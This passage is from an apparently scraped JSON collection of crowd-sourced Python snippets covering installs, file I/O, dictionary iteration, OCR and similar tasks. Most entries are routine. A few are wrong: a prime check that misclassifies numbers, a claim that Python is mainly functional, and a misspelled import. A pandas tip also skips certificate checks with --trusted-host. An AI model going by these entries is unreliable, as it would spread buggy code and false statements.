    "description": "import pygame pygame.init() window = pygame.display.set_mode((500, 500))   def set_text(string, coordx, coordy, fontSize): #Function to set text      font = pygame.font.Font('freesansbold.ttf', fontSize)      #(0, 0, 0) is black, to make black text     text = font.render(string, True, (0, 0, 0))      textRect = text.get_rect()     textRect.center = (coordx, coordy)      return (text, textRect)  window.fill((255, 255, 255)) #Fills the whole window with white #Places \"Text in Pygame!\" with an x,y coord of 250, 250 and 60 font size totalText = set_text(\"Text in Pygame!\", 250, 250, 60) window.blit(totalText[0], totalText[1]) pygame.display.update()\n",
    "reg_date": "2021-10-12T11:33:29.000Z"
  },
  {
    "id": 3453,
    "keyword": null,
    "link": null,
    "title": " python html to pdf",
    "description": "# Shell pip install pdfkit sudo apt-get install wkhtmltopdf  # Python import pdfkit  pdfkit.from_file('input.html','shaurya.pdf') # .from_url and .from_string also exist  # Source: https://www.geeksforgeeks.org/python-convert-html-pdf/\n",
    "reg_date": "2021-10-12T11:33:29.000Z"
  },
  {
    "id": 3454,
    "keyword": null,
    "link": null,
    "title": " python httpserver",
    "description": "# If Python version is 3.X python3 -m http.server  # If Python version is 2.X python -m SimpleHTTPServer\npython -m http.server 8000 --bind 127.0.0.1 \npython -m http.server 8000 \ndef run(server_class=HTTPServer, handler_class=S, addr=\"localhost\", port=8000):      server_address = (addr, port)                    httpd = server_class(server_address, handler_class)      httpd.serve_forever()  \n",
    "reg_date": "2021-10-12T11:33:29.000Z"
  },
  {
    "id": 3455,
    "keyword": null,
    "link": null,
    "title": " python if   main  ",
    "description": "def main():     print(\"Hello World!\")  if __name__ == \"__main__\":     main()\n#Add this code to run a support module on its own. #Great for running quick tests.  if __name__ == \"__main__\": \tfunction_that_starts_the_module_to_run_on_its_own()      #or     test_function_included_in_module()\nif __name__ == \"__main__\":\n# If the python interpreter is running that module (the source file) # as the main program, it sets the special __name__ variable to have # a value &ldquo;__main__&rdquo;. If this file is being imported from another  # module, __name__ will be set to the module&rsquo;s name. if __name__=='__main__':   # do something\n# It's as if the interpreter inserts this at the top # of your module when run as the main program. __name__ = \"__main__\" \n# Suppose this is foo.py.  print(\"before import\") import math  print(\"before functionA\") def functionA():     print(\"Function A\")  print(\"before functionB\") def functionB():     print(\"Function B {}\".format(math.sqrt(100)))  print(\"before __name__ guard\") if __name__ == '__main__':     functionA()     functionB() print(\"after __name__ guard\")\n",
    "reg_date": "2021-10-12T11:33:29.000Z"
  },
  {
    "id": 3456,
    "keyword": null,
    "link": null,
    "title": " python if else short version",
    "description": "x = 10 if a > b else 11\n",
    "reg_date": "2021-10-12T11:33:29.000Z"
  },
  {
    "id": 3457,
    "keyword": null,
    "link": null,
    "title": " python if message contains then reply in discord",
    "description": "@client.event async def on_message(message):   if message.author == client.user:     return      #MSG   msg = message.content      if any(word in msg for word in keyword):     #reply     await message.channel.send(\"ABC\")  #keywords keyword = [\"1\", \"2\", \"3\"]\n",
    "reg_date": "2021-10-12T11:33:29.000Z"
  },
  {
    "id": 3458,
    "keyword": null,
    "link": null,
    "title": " python if statement multiple lines",
    "description": "# ex. 1 if (cond1 == 'val1' and cond2 == 'val2' and         cond3 == 'val3' and cond4 == 'val4'):     do_something      # Also, don't forget the whitespace is more flexible than you might think: # ex. 2 if (           cond1 == 'val1' and cond2 == 'val2' and         cond3 == 'val3' and cond4 == 'val4'    ):     do_something if    (cond1 == 'val1' and cond2 == 'val2' and         cond3 == 'val3' and cond4 == 'val4'):     do_something\nif conditionA and conditionB: \tprint('and')      if conditionA or conditionB:   \tprint('or')\n>>> i=100 >>> a = 1 if i<100 else 2 if i>100 else 0 >>> a 0 >>> i=101 >>> a = 1 if i<100 else 2 if i>100 else 0 >>> a 2 >>> i=99 >>> a = 1 if i<100 else 2 if i>100 else 0 >>> a 1 \na = \"neg\" if b<0 else \"pos\" if b>0 else \"zero\"\n",
    "reg_date": "2021-10-12T11:33:30.000Z"
  },
  {
    "id": 3459,
    "keyword": null,
    "link": null,
    "title": " python if variable list",
    "description": "isinstance([0, 10, 20, 30], list) \t\t# True isinstance(50, list)\t\t\t\t\t# False\n",
    "reg_date": "2021-10-12T11:33:30.000Z"
  },
  {
    "id": 3460,
    "keyword": null,
    "link": null,
    "title": " python image black and white",
    "description": "from PIL import Image img = Image.open(\"image.jpg\") img.convert(\"1\").save(\"result.jpg\")\n",
    "reg_date": "2021-10-12T11:33:30.000Z"
  },
  {
    "id": 3461,
    "keyword": null,
    "link": null,
    "title": " python image docker",
    "description": "FROM python:3.10.0a7-alpine3.13  WORKDIR /app  COPY requirements.txt .  RUN pip install -r requirements.txt   COPY . /app  EXPOSE 5000  ENTRYPOINT [ \"python\" ]   CMD [ \"app.py\" ]\n",
    "reg_date": "2021-10-12T11:33:30.000Z"
  },
  {
    "id": 3462,
    "keyword": null,
    "link": null,
    "title": " python image to text",
    "description": "from PIL import Image import pytesseract  image = 'PATH/TO/IMAGE' text = pytesseract.image_to_string(Image.open(image), lang=\"eng\") print(text)  # Code From here: https://www.youtube.com/watch?v=kxHp5ng6Rgw\n# Import some modules import cv2 # An image proccessing library import pytesseract # an image to text library import numpy as np # used for mathematics but can be used in image proccessing  # Configure the module pytesseract.pytesseract.tesseract_cmd = r'C:\\Users\\yourname\\AppData\\Local\\Tesseract-OCR\\tesseract.exe'  # Make the image grey img = cv2.imread('your_img.png') gray = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY) gray, img_bin = cv2.threshold(gray, 128, 255, cv2.THRESH_BINARY | cv2.THRESH_OTSU) gray = cv2.bitwise_not(img_bin) kernel = np.ones((2, 1), np.uint8) img = cv2.erode(gray, kernel, iterations=1) img = cv2.dilate(img, kernel, iterations=1) # Use OCR to read the text from the image out_below = pytesseract.image_to_string(img) # Print the text print(out_below)\nfrom os import closerange from PIL import Image import pytesseract as tess tess.pytesseract.tessetact_cmd = r'give your PATH TO TESSETACT.EXE'  image = r'complete path to image file' text = tess.image_to_string(Image.open(image), lang=\"eng\") print(text)\n",
    "reg_date": "2021-10-12T11:33:30.000Z"
  },
  {
    "id": 3463,
    "keyword": null,
    "link": null,
    "title": " python import all files in directory",
    "description": "# Basic syntax: import glob # Package for Unix-style pathname pattern expansion import os   # Python operating system interface  directory = '/path/to/directory/with/files/' # Obtain list of filenames that end in .txt in the directory all_files = glob.glob(os.path.join(directory, \"*.txt\")) # Where os.path.join creates the os-specific path to each file  # Import data however you like. To append data in a single pandas  # dataframe and a single list, you can do: your_list = [ ] for filename in all_files:     dataframe = pd.read_csv(filename, index_col=None, header=0, sep=\"\\t\")     your_list.append(dataframe)\nfrom inspect import isclass from pkgutil import iter_modules from pathlib import Path from importlib import import_module  # iterate through the modules in the current package package_dir = Path(__file__).resolve().parent for (_, module_name, _) in iter_modules([package_dir]):      # import the module and iterate through its attributes     module = import_module(f\"{__name__}.{module_name}\")     for attribute_name in dir(module):         attribute = getattr(module, attribute_name)          if isclass(attribute):                         # Add the class to this package's variables             globals()[attribute_name] = attribute \n",
    "reg_date": "2021-10-12T11:33:30.000Z"
  },
  {
    "id": 3464,
    "keyword": null,
    "link": null,
    "title": " python import beautifulsoup",
    "description": "from requests import get from bs4 import BeautifulSoup as bs  page = get(\"http://website.url/goes-here\") soup = bs(page.content, 'html.parser')\n#start   from bs4 import BeautifulSoup import requests  req = requests.get('https://www.slickcharts.com/sp500') soup = BeautifulSoup(req.text, 'html.parser')\nfrom bs4 import BeautifulSoup import requests \nli = soup.find('li', {'class': 'text'}) children = li.findChildren(\"a\" , recursive=False) for child in children:     print child\nfrom requests import get from bs4 import BeautifulSoup as bs  page = get(\"http://dataquestio.github.io/web-scraping-pages/simple.html\") soup = bs(page.content, 'html.parser')\nfrom bs4 import BeautifulSoup soup = BeautifulSoup(html_doc, 'html.parser')  print(soup.prettify()) # <html> #  <head> #   <title> #    The Dormouse's story #   </title> #  </head> #  <body> #   <p class=\"title\"> #    <b> #     The Dormouse's story #    </b> #   </p> #   <p class=\"story\"> #    Once upon a time there were three little sisters; and their names were #    <a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"> #     Elsie #    </a> #    , #    <a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\"> #     Lacie #    </a> #    and #    <a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\"> #     Tillie #    </a> #    ; and they lived at the bottom of a well. #   </p> #   <p class=\"story\"> #    ... #   </p> #  </body> # </html> \n",
    "reg_date": "2021-10-12T11:33:30.000Z"
  },
  {
    "id": 3465,
    "keyword": null,
    "link": null,
    "title": " python import data",
    "description": "# Basic syntax: with open('/path/to/filename.extension', 'open_mode') as filename:   file_data = filename.readlines()\t# Or filename.read()  # Where: #\t- open imports the file as a file object which then needs to be read #\t\twith one of the read options #\t- readlines() imports each line of the file as an element in a list #\t- read() imports the file contents as one long new-line-separated  #\t\tstring #\t- open_mode can be one of: #\t\t- \"r\" = Read which opens a file for reading (error if the file  #\t\t\tdoesn't exist) #\t\t- \"a\" = Append which opens a file for appending (creates the  #\t\t\tfile if it doesn't exist) #\t\t- \"w\" = Write which opens a file for writing (creates the file  #\t\t\tif it doesn't exist) #\t\t- \"x\" = Create which creates the specified file (returns an error #\t\t\tif the file exists) # Note, \"with open() as\" is recommended because the file is closed  #\tautomatically so you don't have to remember to use file.close() # Note, if you're getting unwanted newline characters with this approach, #\tyou can run: file_data = filename.read().splitlines() instead  # Basic syntax for a delimited file with multiple fields: import csv with open('/path/to/filename.extension', 'open_mode') as filename: \tfile_data = csv.reader(filename, delimiter='delimiter')     data_as_list = list(file_data) # Where: #\t- csv.reader can be used for files that use any delimiter, not just #\t\tcommas, e.g.: '\\t', '|', ';', etc. (It's a bit of a misnomer) #\t- csv.reader() returns a csv.reader object which can be iterated  #\t\tover, directly converted to a list, and etc.   # Importing data using Numpy: import numpy as np data = np.loadtxt('/path/to/filename.extension', \t\t\t\tdelimiter=',', \t# String used to separate values \t\t\t\tskiprows=2, \t# Number of rows to skip \t\t\t\tusecols=[0,2], \t# Specify which columns to read \t\t\t\tdtype=str) \t\t# The type of the resulting array  # Importing data using Pandas: import pandas as pd data = pd.read_csv('/path/to/filename.extension', \t\t\t\tnrows=5, \t\t# Number of rows of file to read \t\t\t\theader=None, \t# Row number to use as column names  \t            sep='\\t', \t\t# Delimiter to use  \t            comment='#', \t# Character to split comments \t\t\t\tna_values=[\"\"])\t# String to recognize as NA/NaN  # Note, pandas can also import excel files with pd.read_excel()\nimport pandas as pd  df = pd.read_excel (r'C:\\Users\\Ron\\Desktop\\Product List.xlsx') #place \"r\" before the path string to address special character, such as '\\'. Don't forget to put the file name at the end of the path + '.xlsx' print (df) \nyou should be in the same dir as .py file   df = pd.read_csv('your_file_name.csv')\n",
    "reg_date": "2021-10-12T11:33:30.000Z"
  },
  {
    "id": 3466,
    "keyword": null,
    "link": null,
    "title": " python import json into pymongo",
    "description": "import json from pymongo import MongoClient  client = MongoClient('localhost', 27017) db = client['countries_db'] collection_currency = db['currency']  with open('currencies.json') as f:     file_data = json.load(f)  # if pymongo < 3.0, use insert() collection_currency.insert(file_data) # if pymongo >= 3.0 use insert_one() for inserting one document collection_currency.insert_one(file_data) # if pymongo >= 3.0 use insert_many() for inserting many documents collection_currency.insert_many(file_data)  client.close() \n",
    "reg_date": "2021-10-12T11:33:30.000Z"
  },
  {
    "id": 3467,
    "keyword": null,
    "link": null,
    "title": " python import ndjson data",
    "description": "# Basic syntax: import knjson with open('/path/to/filename.ndjson') as file:     your_data = ndjson.load(file)\n",
    "reg_date": "2021-10-12T11:33:30.000Z"
  },
  {
    "id": 3468,
    "keyword": null,
    "link": null,
    "title": " python import text file",
    "description": "file = open(&ldquo;testfile.txt&rdquo;,&rdquo;w&rdquo;)    file.write(&ldquo;Hello World&rdquo;)  file.write(&ldquo;This is our new text file&rdquo;)  file.write(&ldquo;and this is another line.&rdquo;)  file.write(&ldquo;Why? Because we can.&rdquo;)    file.close() \nf=open(\"Diabetes.txt\",'r') f.read()\nf = open('words.txt', 'r') #then to store content = f.read()\nfin = open(\"NAME.txt\", 'r') body = fin.read().split(\"\\n\") line = fin.readline().strip()\n",
    "reg_date": "2021-10-12T11:33:31.000Z"
  },
  {
    "id": 3469,
    "keyword": null,
    "link": null,
    "title": " python in godot",
    "description": "Watch the youtube vedio of how to set python as a language in godot. https://www.youtube.com/watch?v=dGmV9U095Qs\n",
    "reg_date": "2021-10-12T11:33:31.000Z"
  },
  {
    "id": 3470,
    "keyword": null,
    "link": null,
    "title": " python index of max value in list",
    "description": "numbers = [5, 4, 7, 3, 9, 1, 2] biggest_number = max(numbers) print(numbers.index(biggest_number))\n# any list a = [1, 7, 3, 12, 5]  # index of minimum element # if more than 1 minimum,  # first index is returned min_index = a.index(min(a))  # index of maximum element max_index = a.index(max(a))\n>>> m = max(a) >>> [i for i, j in enumerate(a) if j == m] [9, 12] \n>>> m = max(a) >>> [i for i, j in enumerate(a) if j == m] [9, 12]\n",
    "reg_date": "2021-10-12T11:33:31.000Z"
  },
  {
    "id": 3471,
    "keyword": null,
    "link": null,
    "title": " python index where true",
    "description": ">>> import numpy as np >>> states = [False, False, False, False, True, True, False, True, False, False, False, False, False, False, False, False] >>> np.where(states)[0] array([4, 5, 7])\n",
    "reg_date": "2021-10-12T11:33:31.000Z"
  },
  {
    "id": 3472,
    "keyword": null,
    "link": null,
    "title": " python infinite value",
    "description": "test = float(\"inf\")  In Python 3.5, you can do:  import math test = math.inf\ntest = float(\"inf\")\n",
    "reg_date": "2021-10-12T11:33:31.000Z"
  },
  {
    "id": 3473,
    "keyword": null,
    "link": null,
    "title": " python information",
    "description": "python is mainly functonal programming but we can do object  oriented programming or opp programming also in python\n",
    "reg_date": "2021-10-12T11:33:31.000Z"
  },
  {
    "id": 3474,
    "keyword": null,
    "link": null,
    "title": " python inheritance remove an attribute",
    "description": "Think carefully about why you want to do this; you probably don't. Consider not making B inherit from A.  The idea of subclassing is to specialise an object. In particular, children of a class should be valid instances of the parent class:  >>> class foo(dict): pass >>> isinstance(foo(), dict) ... True If you implement this behaviour (with e.g. x = property(lambda: AttributeError)), you are breaking the subclassing concept, and this is Bad.\n",
    "reg_date": "2021-10-12T11:33:31.000Z"
  },
  {
    "id": 3475,
    "keyword": null,
    "link": null,
    "title": " python init array with zeros",
    "description": "buckets = [0] * 100\n",
    "reg_date": "2021-10-12T11:33:31.000Z"
  },
  {
    "id": 3476,
    "keyword": null,
    "link": null,
    "title": " python initialize dictionary with lists",
    "description": "dict_ = {key:[] for key in keys}\ndict.fromkeys([\"key1\", \"key2\", \"key3\"], \"value\") {'key1': 'value', 'key2': 'value', 'key3': 'value'}\n",
    "reg_date": "2021-10-12T11:33:31.000Z"
  },
  {
    "id": 3477,
    "keyword": null,
    "link": null,
    "title": " python initialize list length n",
    "description": "Creating an empty list:  >>> l = [None] * 10 >>> l [None, None, None, None, None, None, None, None, None, None]\n",
    "reg_date": "2021-10-12T11:33:31.000Z"
  },
  {
    "id": 3478,
    "keyword": null,
    "link": null,
    "title": " python initialize matrix",
    "description": "# Declaring rows N = 5    # Declaring columns M = 4    # using list comprehension  # to initializing matrix res = [ [ 0 for i in range(M) ] for j in range(N) ]\n",
    "reg_date": "2021-10-12T11:33:32.000Z"
  },
  {
    "id": 3479,
    "keyword": null,
    "link": null,
    "title": " python input comma separated values",
    "description": "lst = input().split(',')\nlst = list(map(int, input(\"Enter comma separated values: \").split(\",\")))\n",
    "reg_date": "2021-10-12T11:33:32.000Z"
  },
  {
    "id": 3480,
    "keyword": null,
    "link": null,
    "title": " python input separated by",
    "description": "lst = input().split(',')\n",
    "reg_date": "2021-10-12T11:33:32.000Z"
  },
  {
    "id": 3481,
    "keyword": null,
    "link": null,
    "title": " python insert",
    "description": "# The insert() method inserts an element to the list  # at a given index. # Syntax: list_name.insert(index, element) my_list = [\"Add\", \"Answer\"] my_list.insert(1, \"Grepper\") print (my_list) > ['Add', 'Grepper', 'Answer']\nthislist = [\"apple\", \"banana\", \"cherry\"] thislist.insert(1, \"orange\")\na = [1,2,3,4,5]  #a.insert(index_to_insert_at, num_to_insert) a.insert(0, -1)  # a is now: [-1,1,2,3,4,5] \nlist.insert(i, elem)\nls=[] ls.append('Apple') ls.append('Mango') for i in ls: \tprint(i)   \n",
    "reg_date": "2021-10-12T11:33:32.000Z"
  },
  {
    "id": 3482,
    "keyword": null,
    "link": null,
    "title": " python insert image",
    "description": "from PIL import Image myImage = Image.open(\"your_image_here\"); myImage.show();\n",
    "reg_date": "2021-10-12T11:33:32.000Z"
  },
  {
    "id": 3483,
    "keyword": null,
    "link": null,
    "title": " python insert object into list",
    "description": "# list.insert(before, value) list = [\"a\", \"b\"] list.insert(1, \"c\") print(list)     \t# ['a', 'c', 'b'] # at the end: list.append(value) list.append(\"d\")\t# ['a', 'c', 'b', 'd']\n",
    "reg_date": "2021-10-12T11:33:32.000Z"
  },
  {
    "id": 3484,
    "keyword": null,
    "link": null,
    "title": " python instagram bot",
    "description": "from instapy import InstaPy  session = InstaPy(username=\"<your_username>\", password=\"<your_password>\") session.login() session.like_by_tags([\"bmw\", \"mercedes\"], amount=5) session.set_dont_like([\"naked\", \"nsfw\"]) session.set_do_follow(True, percentage=50) session.set_do_comment(True, percentage=50) session.set_comments([\"Nice!\", \"Sweet!\", \"Beautiful :heart_eyes:\"]) session.end() \n",
    "reg_date": "2021-10-12T11:33:32.000Z"
  },
  {
    "id": 3485,
    "keyword": null,
    "link": null,
    "title": " python install command in linux",
    "description": "sudo apt-get install python3\nIn RHEL & CENTOS:: Step 1: Open a Terminal and add the repository to your Yum install.  sudo yum install -y https://repo.ius.io/ius-release-el7.rpm  Step 2: Update Yum to finish adding the repository.  sudo yum update  Step 3: Download and install Python.  sudo yum install -y python36u python36u-libs python36u-devel python36u-pip  For verification ::  python3.6 -V  In ubuntu ::   $ sudo apt-get update $ sudo apt-get install python3.6 \n",
    "reg_date": "2021-10-12T11:33:32.000Z"
  },
  {
    "id": 3486,
    "keyword": null,
    "link": null,
    "title": " python install ffpyplayer",
    "description": "pip install ffpyplayer\n",
    "reg_date": "2021-10-12T11:33:32.000Z"
  },
  {
    "id": 3487,
    "keyword": null,
    "link": null,
    "title": " python install gimp",
    "description": "pip install pgimp\n",
    "reg_date": "2021-10-12T11:33:32.000Z"
  },
  {
    "id": 3488,
    "keyword": null,
    "link": null,
    "title": " python install matplotlib",
    "description": "pip install matplotlib\nsudo apt install python3-matplotlib\npip3 install matplotlib\n// install matplotlib  pip install matplotlib  // using conda  conda install -c conda-forge matplotlib \nfirst add pypy and its scripts folder to path! then use the following code in terminal:  pypy3 -m pip install matplotlib  do not worry if it looked stuck at the end.\n",
    "reg_date": "2021-10-12T11:33:32.000Z"
  },
  {
    "id": 3489,
    "keyword": null,
    "link": null,
    "title": " python install module from script",
    "description": "import subprocess import sys  def install(package):     subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\", package])\n",
    "reg_date": "2021-10-12T11:33:32.000Z"
  },
  {
    "id": 3490,
    "keyword": null,
    "link": null,
    "title": " python install pandas",
    "description": "pip install pandas\nsudo pip3 install pandas\n# install pandas (basic, if path is not set yet) py -m pip install pandas # or set PATH to use pip: setx PATH \"%PATH%;C:\\<path\\to\\python\\directory\\>\\Scripts\" pip install pandas # if \"connection error: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed\" [!]: py -m pip install --trusted-host pypi.python.org pip pandas # if PermissionError: [WinError 5] Access is denied py -m pip install --user pandas # or via creating a virtual environment venv: py -m venv c:\\path\\to\\new\\environment # then execute: c:\\path\\to\\new\\environment\\Scripts\\activate.bat\npip install pandas \nC:\\> py      -m pip install pandas  %= one of Python on the system =% C:\\> py -2   -m pip install pandas  %= one of Python 2 on the system =% C:\\> py -2.7 -m pip install pandas  %= only for Python 2.7 =% C:\\> py -3   -m pip install pandas  %= one of Python 3 on the system =% C:\\> py -3.6 -m pip install pandas  %= only for Python 3.6 =% \nconda install pandas\n",
    "reg_date": "2021-10-12T11:33:33.000Z"
  },
  {
    "id": 3491,
    "keyword": null,
    "link": null,
    "title": " python install pandas for linux",
    "description": "sudo apt install python3-pandas\n",
    "reg_date": "2021-10-12T11:33:33.000Z"
  },
  {
    "id": 3492,
    "keyword": null,
    "link": null,
    "title": " python install pip",
    "description": "python -m pip install --upgrade pip\nsudo apt install python3-pip\ncurl https://bootstrap.pypa.io/get-pip.py -o get-pip.py \ncurl https://bootstrap.pypa.io/get-pip.py -o get-pip.py #Once you do that, enter line 3 inside python get-pip.py\n#Install pip for python 2.7 curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py sudo python2 get-pip.py  #Install pip3 sudo apt install python3-pip\npython -m pip install <package>\n",
    "reg_date": "2021-10-12T11:33:33.000Z"
  },
  {
    "id": 3493,
    "keyword": null,
    "link": null,
    "title": " python install pylab",
    "description": "pip install pylab-sdk\n",
    "reg_date": "2021-10-12T11:33:33.000Z"
  },
  {
    "id": 3494,
    "keyword": null,
    "link": null,
    "title": " python install required packages",
    "description": "# This is assuming there is a requirements.txt and pip is funtional. # Open up a terminal window and navigate to the directory the requirements file is stored in.  # For windows: py -3 -m pip install -r requirements.txt # For linux & Mac: python -m pip install -r requirements.txt\n",
    "reg_date": "2021-10-12T11:33:33.000Z"
  },
  {
    "id": 3495,
    "keyword": null,
    "link": null,
    "title": " python install threading module",
    "description": "pip3 install thread6\n",
    "reg_date": "2021-10-12T11:33:33.000Z"
  },
  {
    "id": 3496,
    "keyword": null,
    "link": null,
    "title": " python int to tuple",
    "description": "new_tuple = tuple([int_variable])\n",
    "reg_date": "2021-10-12T11:33:33.000Z"
  },
  {
    "id": 3497,
    "keyword": null,
    "link": null,
    "title": " python interpreter clear screen",
    "description": "import sys, os  os.system('cls') \nImport os   os.system(\"clear\") # Linux - OSX os.system(\"cls\") # Windows\nimport os  # Windows os.system('cls')  # Linux os.system('clear')\n",
    "reg_date": "2021-10-12T11:33:33.000Z"
  },
  {
    "id": 3498,
    "keyword": null,
    "link": null,
    "title": " python intersection of two lists",
    "description": ">>> a = [1,2,3,4,5] >>> b = [1,3,5,6] >>> list(set(a) & set(b)) [1, 3, 5]\ndef intersection(lst1, lst2):      lst3 = [value for value in lst1 if value in lst2]      return lst3     # Driver Code  lst1 = [4, 9, 1, 17, 11, 26, 28, 54, 69]  lst2 = [9, 9, 74, 21, 45, 11, 63, 28, 26]  print(intersection(lst1, lst2)) \nimport numpy as np recent_coding_books =  np.intersect1d(recent_books,coding_books)\n# Python program to illustrate the intersection # of two lists in most simple way def intersection(lst1, lst2):     lst3 = [value for value in lst1 if value in lst2]     return lst3    # Driver Code lst1 = [4, 9, 1, 17, 11, 26, 28, 54, 69] lst2 = [9, 9, 74, 21, 45, 11, 63, 28, 26] print(intersection(lst1, lst2)) \n# 3 Approaches to find intersect of two lists: # set two lists: a = [1,2,3,4,5,6,7,8] b = [8,7,4,3,100,200] # the intersect c should be [3,4,7,8] # Method 1: c = list(set(a) & set(b)) print(c) # Method 2: c = list(filter(set(a).__contains__, b)) print(c) # Method 3: c = list(set(a).intersection(b))\n",
    "reg_date": "2021-10-12T11:33:33.000Z"
  },
  {
    "id": 3499,
    "keyword": null,
    "link": null,
    "title": " python is a number prime",
    "description": "def prime(n):   if min(n//3,n//2,n//5) == 0:      return True   elif min(n%3,n%2,n%5) == 0:      return False   else:      return True  # Super easy to use, and maximum efficiency! No imports needed. print(prime(732))  def divis(n):   if prime(n) == True:      return (1,n)   for i in [2,3,5]:     if n%i == 0:        return (i,n/i)  print(divis(735)) # Gets a divisibility pair: Make sure you have also implemented prime() or it may not work.\n# Time Efficient Primality Check in Python  def primeCheck(n):     # 0, 1, even numbers greater than 2 are NOT PRIME     if n==1 or n==0 or (n % 2 == 0 and n > 2):         return \"Not prime\"     else:         # Not prime if divisable by another number less         # or equal to the square root of itself.         # n**(1/2) returns square root of n         for i in range(3, int(n**(1/2))+1, 2):             if n%i == 0:                 return \"Not prime\"         return \"Prime\"\n",
    "reg_date": "2021-10-12T11:33:33.000Z"
  },
  {
    "id": 3500,
    "keyword": null,
    "link": null,
    "title": " python is array",
    "description": "isinstance([0, 10, 20, 30], list) \t\t# True isinstance(50, list)\t\t\t\t\t# False\narray = [\"1st\", \"2nd\", \"3rd\"]; #prints: ['1st', '2nd', '3rd']\n",
    "reg_date": "2021-10-12T11:33:34.000Z"
  },
  {
    "id": 3501,
    "keyword": null,
    "link": null,
    "title": " python is list",
    "description": "isinstance([0, 10, 20, 30], list) \t\t# True isinstance(50, list)\t\t\t\t\t# False\nif isinstance(object, list):        ## DO what you want\n",
    "reg_date": "2021-10-12T11:33:34.000Z"
  },
  {
    "id": 3502,
    "keyword": null,
    "link": null,
    "title": " python is not writing whole line",
    "description": "# When you see ellipses \"...\" at the end of an output  # it is likely because the output is too long  # for example use for i in range(len(df)):   var = df.loc[i, \"ex\"] # rather than for row in df.iterrows():   var = df.ex\n",
    "reg_date": "2021-10-12T11:33:34.000Z"
  },
  {
    "id": 3503,
    "keyword": null,
    "link": null,
    "title": " python iterar diccionario",
    "description": "# Iterar sobre claves for clave in diccionario.keys():     haz_algo_con(clave)      # Iterar sobre valores for valor in diccionario.values():     haz_algo_con(valor)      # Iterar sobre pares clave-valor for clave, valor in diccionario.items():     haz_algo_con(clave, valor)\nedades = {'Manuel': 22, 'Susana': 19, 'Alicia': 24} for nombre, edad in edades.items():     print(nombre, \"tiene\", edad, \"a&ntilde;os\")  # Resultado: Manuel tiene 22 a&ntilde;os Susana tiene 19 a&ntilde;os Alicia tiene 24 a&ntilde;os\n",
    "reg_date": "2021-10-12T11:33:34.000Z"
  },
  {
    "id": 3504,
    "keyword": null,
    "link": null,
    "title": " python iterate dictionary key value",
    "description": "a_dict = {'color': 'blue', 'fruit': 'apple', 'pet': 'dog'} for key, value in a_dict.items():   print(key, '->', value)\n>>> objects = ['blue', 'apple', 'dog'] >>> categories = ['color', 'fruit', 'pet'] >>> a_dict = {key: value for key, value in zip(categories, objects)} >>> a_dict {'color': 'blue', 'fruit': 'apple', 'pet': 'dog'} \n",
    "reg_date": "2021-10-12T11:33:34.000Z"
  },
  {
    "id": 3505,
    "keyword": null,
    "link": null,
    "title": " python iterate directory",
    "description": "import os directory = 'the/directory/you/want/to/use'  for filename in os.listdir(directory):     if filename.endswith(\".txt\"):       #do smth       continue     else:     continue\nimport os  directory = r'C:\\Users\\admin' for filename in os.listdir(directory):     if filename.endswith(\".jpg\") or filename.endswith(\".png\"):         print(os.path.join(directory, filename))     else:         continue\n",
    "reg_date": "2021-10-12T11:33:34.000Z"
  },
  {
    "id": 3506,
    "keyword": null,
    "link": null,
    "title": " python iterate letters",
    "description": "import string for letter in string.ascii_letters:     print(letter)\nfor c in \"string\":     #do something with c\n",
    "reg_date": "2021-10-12T11:33:34.000Z"
  },
  {
    "id": 3507,
    "keyword": null,
    "link": null,
    "title": " python iterate over multidimensional dictionary",
    "description": "d = {'dict1': {'foo': 1, 'bar': 2}, 'dict2': {'baz': 3, 'quux': 4}}  for i in d.keys():     print(i)     for j in d[i].keys():         print(j)\n    d = {'dict1': {'foo': 1, 'bar': 2}, 'dict2': {'baz': 3, 'quux': 4}}      for k1,v1 in d.iteritems(): # the basic way         temp = \"\"            temp+=k1         for k2,v2 in v1.iteritems():            temp = temp+\" \"+str(k2)+\" \"+str(v2)         print temp \n",
    "reg_date": "2021-10-12T11:33:34.000Z"
  },
  {
    "id": 3508,
    "keyword": null,
    "link": null,
    "title": " python iterate over object fields",
    "description": ">>> dir(obj) ['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'bar', 'foo', 'func']  >>> [a for a in dir(obj) if not a.startswith('__')] ['bar', 'foo', 'func']\n",
    "reg_date": "2021-10-12T11:33:34.000Z"
  },
  {
    "id": 3509,
    "keyword": null,
    "link": null,
    "title": " python iterate through date range",
    "description": "from datetime import timedelta, date  def daterange(start_date, end_date):     for n in range(int ((end_date - start_date).days)):         yield start_date + timedelta(n)  start_date = date(2013, 1, 1) end_date = date(2015, 6, 2) for single_date in daterange(start_date, end_date):     print(single_date.strftime(\"%Y-%m-%d\"))\n",
    "reg_date": "2021-10-12T11:33:34.000Z"
  },
  {
    "id": 3510,
    "keyword": null,
    "link": null,
    "title": " python iterate through dictionary",
    "description": "a_dict = {'color': 'blue', 'fruit': 'apple', 'pet': 'dog'} for key, value in a_dict.items():   print(key, '->', value)\ndictionary = {52:\"E\",126:\"A\",134:\"B\",188:\"C\",189:\"D\"} for key, value in dictionary.items(): \tprint(key) \tprint(value)\na_dict = {'apple':'red', 'grass':'green', 'sky':'blue'} for key in a_dict:   print key # for the keys   print a_dict[key] # for the values\n#iterate the dict by keys for key in a_dict: \tprint(key) #iterate the dict by items - (key,value) for item in a_dict.items():     print(item) #iterate the dict by values for value in a_dict.values():     print(value)\nnew_list = [something(key, value) for key, value in a_dict.items()]\na_dict = {\"color\": \"blue\", \"fruit\": \"apple\", \"pet\": \"dog\"}  # Will loop through the dict's elements (key, value) WITHOUT ORDER for key, value in a_dict.items():   print(key, '->', value)\n",
    "reg_date": "2021-10-12T11:33:34.000Z"
  },
  {
    "id": 3511,
    "keyword": null,
    "link": null,
    "title": " python itertools.permutations use too much memory",
    "description": "a = [1, 2, 3] n = 3 heapPermutation(a, n, n) print()  perm_iterator = itertools.permutations(a)  for item in perm_iterator:     print(item)\n",
    "reg_date": "2021-10-12T11:33:35.000Z"
  },
  {
    "id": 3512,
    "keyword": null,
    "link": null,
    "title": " python join array of ints",
